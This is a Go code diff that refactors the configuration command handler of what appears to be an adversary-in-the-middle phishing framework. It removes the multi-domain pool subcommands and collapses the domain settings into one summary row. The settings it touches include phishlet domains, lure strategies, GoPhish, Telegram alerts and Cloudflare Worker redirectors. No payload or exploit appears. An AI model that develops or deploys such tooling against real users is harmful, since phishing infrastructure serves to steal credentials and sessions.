@@ -235,46 +235,23 @@ func (t *Terminal) handleConfig(args []string) error {
 
 		redirectorsDir := t.cfg.GetRedirectorsDir()
 
-		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		primaryDomain := t.cfg.GetPrimaryDomain()
-		domainsCount := strconv.Itoa(len(t.cfg.GetDomainManager().GetAllDomains()))
+		domainsSummary := t.cfg.GetBaseDomain()
+		if domainsSummary == "" {
+			domainsSummary = "(not set)"
+		}
+		domainsCount := len(t.cfg.GetDomainManager().GetAllDomains())
+		if domainsCount > 0 {
+			domainsSummary += fmt.Sprintf(" (+%d in pool, use 'domains' command)", domainsCount)
+		} else {
+			domainsSummary += " (use 'domains' command to manage)"
+		}
 		webAdminUrl := fmt.Sprintf("http://127.0.0.1:%d", t.cfg.GetWebAdminPort())
-		vals := []string{t.cfg.GetBaseDomain(), primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
 		switch args[0] {
-		case "domain":
-			// Legacy: set primary domain (backward compatibility)
-			t.cfg.SetBaseDomain(args[1])
-			t.cfg.ResetAllSites()
-			t.manageCertificates(false)
-			return nil
-		case "domains":
-			// List all domains
-			domains := t.cfg.GetDomainManager().GetAllDomains()
-			if len(domains) == 0 {
-				log.Info("no domains configured")
-				return nil
-			}
-			log.Info("\nConfigured Domains:")
-			log.Info("─────────────────────────────────────────────────────────────")
-			for i, d := range domains {
-				status := string(d.Status)
-				primary := ""
-				if d.IsPrimary {
-					primary = " [PRIMARY]"
-				}
-				log.Info("%d. %s (%s)%s", i+1, d.FullDomain, status, primary)
-				if d.Description != "" {
-					log.Info("   Description: %s", d.Description)
-				}
-				if d.CreatedAt.Format("2006-01-02 15:04:05") != "" {
-					log.Info("   Added: %s", d.CreatedAt.Format("2006-01-02 15:04:05"))
-				}
-			}
-			log.Info("─────────────────────────────────────────────────────────────")
-			return nil
 		case "ipv4":
 			t.cfg.SetServerExternalIP(args[1])
 			return nil
@@ -378,60 +355,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			log.Info("redirectors directory set to: %s", args[1])
 			return nil
 		}
-	} else if pn == 4 {
-		switch args[0] {
-		case "domains":
-			switch args[1] {
-			case "add":
-				description := args[3]
-				err := t.cfg.GetDomainManager().AddDomain(args[2], "", "", description, false)
-				if err != nil {
-					return err
-				}
-				t.manageCertificates(false)
-				return nil
-			}
-		}
 	} else if pn == 3 {
 		switch args[0] {
-
-		case "domains":
-			switch args[1] {
-			case "add":
-				description := ""
-				err := t.cfg.AddDomain(args[2], description)
-				if err != nil {
-					return err
-				}
-				t.manageCertificates(false)
-				return nil
-			case "remove":
-				err := t.cfg.GetDomainManager().RemoveDomain(args[2])
-				if err != nil {
-					return err
-				}
-				t.manageCertificates(false)
-				return nil
-			case "set-primary":
-				err := t.cfg.SetPrimaryDomain(args[2])
-				if err != nil {
-					return err
-				}
-				t.manageCertificates(false)
-				return nil
-			case "enable":
-				err := t.cfg.GetDomainManager().SetStatus(args[2], DomainActive)
-				if err != nil {
-					return err
-				}
-				return nil
-			case "disable":
-				err := t.cfg.GetDomainManager().SetStatus(args[2], DomainInactive)
-				if err != nil {
-					return err
-				}
-				return nil
-			}
 		case "ipv4":
 			switch args[1] {
 			case "external":
@@ -3262,16 +3187,14 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+		readline.PcItem("config", readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
-			readline.PcItem("domains", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("set-primary"), readline.PcItem("enable"), readline.PcItem("disable")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("http_port"), readline.PcItem("https_port"), readline.PcItem("dns_port"),
 			readline.PcItem("redirectors_dir")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
-	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
@@ -3292,12 +3215,6 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"cloudflare_worker", "subdomain"}, "cloudflare_worker subdomain <subdomain>", "set the workers.dev subdomain (optional)")
 	h.AddSubCommand("config", []string{"cloudflare_worker", "enabled"}, "cloudflare_worker enabled <true|false>", "enable or disable Cloudflare Worker deployment")
 	h.AddSubCommand("config", []string{"cloudflare_worker", "test"}, "cloudflare_worker test", "test the Cloudflare Worker credentials")
-	h.AddSubCommand("config", []string{"domains"}, "domains list", "list all configured domains with status and primary flag")
-	h.AddSubCommand("config", []string{"domains", "add"}, "domains add <domain> [description]", "add a new domain to the multi-domain pool")
-	h.AddSubCommand("config", []string{"domains", "remove"}, "domains remove <domain>", "remove a domain from the pool")
-	h.AddSubCommand("config", []string{"domains", "set-primary"}, "domains set-primary <domain>", "set which domain is the primary domain")
-	h.AddSubCommand("config", []string{"domains", "enable"}, "domains enable <domain>", "enable a domain for use")
-	h.AddSubCommand("config", []string{"domains", "disable"}, "domains disable <domain>", "disable a domain (keeps it in pool but inactive)")
 
 	h.AddSubCommand("config", []string{"http_port"}, "http_port <port>", "set HTTP proxy port")
 	h.AddSubCommand("config", []string{"https_port"}, "https_port <port>", "set HTTPS proxy port")
